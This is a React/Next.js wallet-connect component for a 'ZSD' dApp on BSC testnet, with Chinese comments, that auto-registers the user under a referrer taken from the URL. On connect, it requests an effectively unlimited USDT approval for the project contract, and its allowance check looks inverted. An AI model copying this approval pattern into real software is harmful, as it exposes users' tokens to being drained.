"use client";
import React, { useState, useEffect } from "react";
import { message, Modal, Input, Form, Button, Row, Col } from "antd";
import { createWallet, walletConnect } from "thirdweb/wallets";
import { ConnectButton } from "thirdweb/react";
import { bscTestnet } from "thirdweb/chains";
import { client } from "../../src/app/client";
import { Inter } from "next/font/google";
import type { Metadata } from "next";
const inter = Inter({ subsets: ["latin"] });
import styles from "./index.module.scss";

import {
  getContract,
  prepareContractCall,
  sendAndConfirmTransaction,
  readContract,
} from "thirdweb";
import { APIConfig } from "../../abi/APIConfiguration";
import { useActiveAccount } from "thirdweb/react";
import { USDTAbi } from "../../abi/USDTAbi";
import { ZSDABI } from "../../abi/ZSDABI";  //ZSDABI
import { ZSDPROJECTABI } from "../../abi/ZSDPROJECTABI";  //ZSDPROJECTABI
// import { ZSDSwapABI } from "../../abi/ZSDSwapABI";  //ZSDSwapABI

// const THIRDWEB_PROJECT_ID: any = process.env.NEXT_PUBLIC_TEMPLATE_CLIENT_ID;
const contractABI: any = USDTAbi;
const contractZSDABI: any = ZSDABI;
const contractZSDPROJECTABI: any = ZSDPROJECTABI;

export const metadata: Metadata = {
  title: "ZSD",
  description:
    "Starter template for using thirdweb SDK with Next.js App router",
};

const wallets: any = [
  createWallet("io.metamask"),
  createWallet("com.coinbase.wallet"),
  walletConnect(),
];

const ZSDContract = getContract({
  client: client,
  address: APIConfig.ZSDaddress,
  chain: bscTestnet,
  abi: contractABI
});

//USDT
const USDT = getContract({
  client: client,
  address: APIConfig.USDTaddress,
  chain: bscTestnet,
  abi: contractABI,
});

//用户必须已经授权本合约从USDT合约划转账务
const ZSD = getContract({
  client: client,
  address: APIConfig.ZSDaddress,
  abi: contractZSDABI,
  chain: bscTestnet,
});

// ZSDProject
const ZSDProjectfun = getContract({
  client: client,
  address: APIConfig.ZSDPROJECTAddress,
  chain: bscTestnet,
  abi: contractZSDPROJECTABI,
});


const CallWallet = () => {
  const [isModalOpen, setIsModalOpen] = useState<boolean>(false);
  const [form] = Form.useForm();
  const account: any = useActiveAccount();

  const handleOk = () => {
    setIsModalOpen(false);
  };

  const disconnectWallet = async (wallet: any) => {
    try {
      await wallet.disconnect(); // 假设这里不需要传入参数
    } catch (error) {
      console.error("Failed to disconnect wallet:", error);
      message.error("登出钱包失败，请稍后重试。");
    }
  };

  // const handleCancel = async () => {
  //   try {
  //     wallets.forEach((wallet: { disconnect: (arg0: any) => void; }) => {
  //       if (wallet.disconnect) {
  //         wallet.disconnect(wallet);
  //       }
  //     });
  //     message.error('未填写邀请码，钱包已登出');
  //     setIsModalOpen(false);
  //   } catch (error) {
  //     message.error('登出钱包失败，请重试。');
  //   }
  // };

  const handleCancel = async () => {
    if (!wallets || wallets.length === 0) {
      message.error("没有可登出的钱包");
      setIsModalOpen(false);
      return;
    }
    try {
      // 使用 Promise.all 来并行处理所有钱包的登出
      await Promise.all(wallets.map(disconnectWallet));
      message.error("未填写邀请码，钱包已登出");
      setIsModalOpen(false);
    } catch (error) {
      // 如果任何一个钱包登出失败，捕获错误并显示消息
      message.error("登出钱包失败，请重试。");
    }
  };

  // 判断用户是否登录
  const WhetherInviteUsers = async () => {
    const search = window.location.search;
    const params = new URLSearchParams(search);
    const Inviteaddress: any = params.get("ref");
    console.log(account.address, "邀请人地址:", Inviteaddress);

    try {
      // 查询是否已注册
      const registerTX = prepareContractCall({
        contract: ZSDProjectfun,
        method: "function register(address)",
        params: [Inviteaddress],
      });
      const registerTXResult = await sendAndConfirmTransaction({
        transaction: registerTX,
        account: account,
      });
      console.log("查询是否已注册:", registerTXResult);


      // *********************************************************登录后授权*********************************************************************
      //用户USDT的余额
      const USDTBalance = await readContract({
        contract: USDT,
        method: "function balanceOf(address) view returns (uint256)",
        params: [account.address],
      });
      console.log("USDT余额:", USDTBalance);


      // if (USDTBalance == 0) {
      //   message.info("USDT余额为0，请充值USDT");
      //   return;
      // }


      const allowanceUSDTBalance = await readContract({
        contract: USDT,
        method: "function allowance(address, address)",
        params: [account.address, APIConfig.ZSDPROJECTAddress],
      });

      if (allowanceUSDTBalance == 0) {
        message.info("请授权ZSD合约使用您的USDT");
        return;
      }
      // if (USDTBalance < 0) {
      //zsd合约有权限调用用户 balance的资产 ||  用户将自己的 USDT转出banlance的权限赋予zsd合约
      const banlance: any = 10000000000000000000000000 * 10 ** 18;
      const tx1 = prepareContractCall({
        contract: USDT,
        method: "function approve(address, uint256) returns (bool)",
        params: [APIConfig.ZSDPROJECTAddress, banlance],
      });
      console.log(tx1, 'tx1')
      // 用户将usdt转给zsd合约
      const tx1Result = await sendAndConfirmTransaction({
        transaction: tx1,
        account: account,
      });

      // }
    } catch (error: any) {
      console.log("查询是否已注册:", error);


      const firstLine = error.toString().split("\n")[0];
      const match = firstLine.match(/TransactionError: Error - (.+)/);
      if (match && match[1]) {
        switch (match[1]) {
          case "referrer has not deposited":
            message.info("邀请人必须已经投资过");
            break;
          case "User already registered":
            message.info("邀请用户未注册");
            break;
          case "You cannot refer":
            message.info("邀请人和用户不是同一个人");
            break;
          default:
            message.error("发生未知错误");
            break;
        }
        setIsModalOpen(true);
      } else if (error instanceof TypeError) {
        if (
          error.message.includes(
            "Cannot read properties of null (reading '1')"
          )
        ) {
          message.error("发生错误：尝试读取 null 对象的属性");
          setIsModalOpen(true);
        } else {
          message.error("发生类型错误");
          setIsModalOpen(true);
        }
      } else {
        message.error("输入错误，请输入正确的邀请人地址");
        setIsModalOpen(true);
      }
    }
  }

  // 输入邀请链接
  const onFriendRechargeFun = async () => {
    const values = form.getFieldsValue();
    try {
      const registerTX = prepareContractCall({
        contract: ZSDContract,
        method: "function register(address)",
        params: [values.Invitelink],
      });
      const registerTXResult = await sendAndConfirmTransaction({
        transaction: registerTX,
        account: account,
      });
    } catch (error: any) {
      const firstLine = error.toString().split("\n")[0];
      const match = firstLine.match(/TransactionError: Error - (.+)/);
      if (match && match[1]) {
        switch (match[1]) {
          case "referrer has not deposited":
            message.info("邀请人必须已经投资过");
            break;
          case "User already registered":
            message.info("邀请用户未注册");
            break;
          case "You cannot refer":
            message.info("邀请人和用户不是同一个人");
            break;
          default:
            message.error("发生未知错误");
            break;
        }
        setIsModalOpen(true);
      } else if (error instanceof TypeError) {
        if (
          error.message.includes("Cannot read properties of null (reading '1')")
        ) {
          message.error("发生错误：尝试读取 null 对象的属性");
          setIsModalOpen(true);
        } else {
          message.error("发生类型错误");
          setIsModalOpen(true);
        }
      }
      else {
        message.error("输入错误，请输入正确的邀请人地址");
        setIsModalOpen(true);
      }
    }
  };

  useEffect(() => {
    if (account) {
      WhetherInviteUsers();
    }
  }, [account]);

  // 假设这些方法是在一个服务或者工具类中实现的，可以根据实际情况调用相关的身份验证服务或API
  // 检查用户是否已经登录
  // const isLoggedIn = async () => {
  //   // 在这里实现你的具体逻辑，例如检查是否有有效的登录状态或者认证令牌
  //   // 这里只是示例，实际情况可能涉及到身份验证的后端服务调用或者本地存储的状态判断
  //   console.log("钱包地址：");
  //   setIsModalOpen(true); // 登录成功后设置模态框打开
  //   return true; // 假设这里直接返回 true 表示已登录，实际中可能需要根据具体情况返回不同的结果
  // };

  // // 执行登录操作
  // const login = async (params: any) => {
  //   // params 可能包含用户名、密码等登录所需的参数
  //   console.log("签名信息:", params);
  // };

  // 生成登录凭证或者载荷
  // const generatePayload = async ({ address }: { address: any }) => {
  //   // 假设这里调用后端服务来生成登录凭证，然后返回给客户端
  //   const basePayload: any = await generatePayload({ address });
  //   // 添加缺少的属性
  //   const issuedAt = Date.now(); // 当前时间戳作为 issued_at
  //   const expirationTime = issuedAt + 3600000; // 假设1小时后过期
  //   const invalidBefore = issuedAt - 1; // 假设在 issued_at 之前无效（这只是一个示例，通常不会这样设置）

  //   return {
  //     ...basePayload,
  //     issued_at: issuedAt,
  //     expiration_time: expirationTime,
  //     invalid_before: invalidBefore,
  //   };
  // };

  // 执行登出操作
  // const logout = async () => {
  //   // 在这里实现登出的具体逻辑，例如清除本地存储的用户信息或者调用后端服务来注销用户
  //   console.log("执行登出操作");
  // };
  return (
    <div className={inter.className}>
      <ConnectButton
        theme={"dark"}
        connectModal={{ size: "compact" }}
        wallets={wallets}
        client={client}
        chain={bscTestnet}
      />
      <Modal
        title=""
        open={isModalOpen}
        onOk={handleOk}
        onCancel={handleCancel}
        destroyOnClose={true}
        footer={
          <div style={{ display: "flex", justifyContent: "space-between" }}>
            <Button onClick={handleCancel} className={styles.Cancelstyle}>
              取消
            </Button>
            <Button
              className={styles.verifystyle}
              htmlType="submit"
              onClick={onFriendRechargeFun}
            >
              确认
            </Button>
          </div>
        }
      >
        <Form form={form} name="friendRechargeForm">
          <Row>
            <div className={styles.Topmodel}>邀请人地址</div>
            <Col span={24}>
              <Form.Item name="Invitelink">
                <Input
                  className={styles.inputstyle}
                  placeholder="请填写/粘帖邀请链地址"
                />
              </Form.Item>
            </Col>
          </Row>
        </Form>
      </Modal>
    </div>
  );
};

export default CallWallet;